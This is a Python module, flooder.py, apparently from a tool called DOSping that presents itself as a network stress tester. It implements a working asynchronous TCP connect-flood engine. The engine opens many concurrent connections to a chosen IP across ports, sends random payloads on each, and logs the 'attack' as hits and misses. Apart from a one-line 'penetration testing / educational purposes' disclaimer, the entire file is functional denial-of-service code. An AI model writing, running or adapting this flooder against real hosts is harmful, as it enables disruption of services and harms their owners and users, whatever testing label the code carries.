# ═══════════════════════════════════════════════════════════════
#  flooder.py  —  Async TCP Flood Engine
# ═══════════════════════════════════════════════════════════════
#  Part of DOSping v3.0  —  Network Stress Testing TUI
#
#  This module handles concurrent TCP connection flooding.
#  Decoupled from the UI so any front-end can drive it.
#
#  Architecture:
#    asyncio.Semaphore gates concurrency to prevent local FD
#    exhaustion.  Each coroutine opens a TCP socket, sends a
#    random 1 KiB payload, then tears down cleanly.
#
#  Rate tracking:
#    _conn_times stores monotonic timestamps of every completed
#    attempt (hit or miss).  connections_per_sec() returns the
#    rolling rate over a configurable window.
#
#  FOR PENETRATION TESTING / EDUCATIONAL PURPOSES ONLY.
# ═══════════════════════════════════════════════════════════════

from __future__ import annotations

import asyncio
import random
import time
from typing import Callable, Optional, List


class Flooder:
    """Asynchronous TCP connect-flood engine.

    Opens *bots* concurrent TCP connections to *target* spread
    round-robin across the given *ports*.  Each connection sends
    a randomised 1 KiB payload then tears down cleanly.

    Parameters
    ----------
    target : str
        IPv4 address of the remote host.
    ports : List[int]
        Target ports to cycle through (round-robin).
    bots : int
        Total number of connections to attempt (default 200).
    concurrency : int
        Max simultaneous open sockets via asyncio.Semaphore
        (default 50).  Prevents local resource exhaustion.
    on_progress : Callable | None
        ``(current, total)`` callback fired after every attempt.
    on_log : Callable | None
        ``(rich_markup_str)`` callback for status messages.
    """

    # ── Construction ─────────────────────────────────────────

    def __init__(
        self,
        target: str,
        ports: List[int],
        bots: int = 200,
        concurrency: int = 50,
        on_progress: Optional[Callable] = None,
        on_log: Optional[Callable] = None,
        on_detail: Optional[Callable] = None,
    ):
        self.target = target
        self.ports = ports
        self.bots = bots
        self.concurrency = concurrency
        self.on_progress = on_progress
        self.on_log = on_log
        self.on_detail = on_detail

        # Counters (reset at the start of each run)
        self.successful: int = 0
        self.failed: int = 0
        self.bytes_sent: int = 0
        self._stopped: bool = False

        # Rate tracking: monotonic timestamps of completed attempts
        self._conn_times: list[float] = []

    # ── Public API ───────────────────────────────────────────

    async def run(self) -> None:
        """Launch the full flood.  Resets counters first."""
        self.successful = 0
        self.failed = 0
        self.bytes_sent = 0
        self._stopped = False
        self._conn_times.clear()

        if self.on_log:
            self.on_log(
                f"[#c8a050]▸ Launching {self.bots} connections "
                f"across port(s) {','.join(map(str, self.ports))}...[/]"
            )

        sem = asyncio.Semaphore(self.concurrency)
        tasks: list[asyncio.Task] = []

        for i in range(self.bots):
            if self._stopped:
                break
            port = self.ports[i % len(self.ports)]
            tasks.append(self._attack(sem, port, i))

        await asyncio.gather(*tasks, return_exceptions=True)

        if self.on_log:
            if self._stopped:
                self.on_log("[#8a5a4a]▸ Attack stopped by user.[/]")
            else:
                self.on_log(
                    f"\n[#6a8a5a]▸ Flood complete: "
                    f"{self.successful} connected, {self.failed} failed[/]"
                )

    def stop(self) -> None:
        """Set the stop flag.  Running coroutines exit early."""
        self._stopped = True
        if self.on_log:
            self.on_log("[#8a5a4a]▸ Stop signal sent...[/]")

    def connections_per_sec(self, window: float = 5.0) -> float:
        """Rolling connection rate over the last *window* seconds."""
        now = time.monotonic()
        cutoff = now - window
        self._conn_times = [t for t in self._conn_times if t >= cutoff]
        if not self._conn_times:
            return 0.0
        return len(self._conn_times) / window

    # ── Internal: single connection attempt ──────────────────

    async def _attack(
        self, sem: asyncio.Semaphore, port: int, index: int
    ) -> None:
        """One TCP connect, send, close cycle."""
        if self._stopped:
            return

        async with sem:
            if self._stopped:
                return

            t_start = time.monotonic()
            status = "OK"
            sent = 0
            error_msg = ""

            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target, port),
                    timeout=3.0,
                )

                payload = random.randbytes(1024)
                writer.write(payload)
                await writer.drain()
                sent = len(payload)
                self.bytes_sent += sent

                writer.close()
                await writer.wait_closed()
                self.successful += 1

            except asyncio.TimeoutError:
                self.failed += 1
                status = "TIMEOUT"
                error_msg = "Connection timed out"
            except asyncio.CancelledError:
                self.failed += 1
                status = "CANCEL"
                error_msg = "Cancelled"
            except ConnectionRefusedError:
                self.failed += 1
                status = "REFUSED"
                error_msg = "Connection refused"
            except OSError as e:
                self.failed += 1
                status = "ERROR"
                error_msg = str(e)
            except Exception as e:
                self.failed += 1
                status = "ERROR"
                error_msg = str(e)

            latency_ms = (time.monotonic() - t_start) * 1000

            # Record timestamp for rate calculation
            self._conn_times.append(time.monotonic())

            # ── Detail callback for packet inspector ─────────
            if self.on_detail:
                try:
                    self.on_detail(port, status, latency_ms, sent, error_msg)
                except Exception:
                    pass

            # ── Progress reporting ───────────────────────────
            total = self.successful + self.failed

            if self.on_progress:
                self.on_progress(total, self.bots)

            # Log every 25 connections (or at the end)
            if total % 25 == 0 or total == self.bots:
                if self.on_log:
                    pct = int((total / self.bots) * 100) if self.bots > 0 else 0
                    bar_w = 20
                    filled = (
                        int(bar_w * total / self.bots) if self.bots > 0 else 0
                    )
                    bar = "█" * filled + "░" * (bar_w - filled)
                    self.on_log(
                        f"  [#3a3a2a]│[/] {bar} [bold #c8c8b8]{pct:3d}%[/] "
                        f"[#3a3a2a]([/][#6a8a5a]{self.successful}[/] "
                        f"[#3a3a2a]hit ╱[/] "
                        f"[#8a5a4a]{self.failed}[/] "
                        f"[#3a3a2a]miss)[/]"
                    )
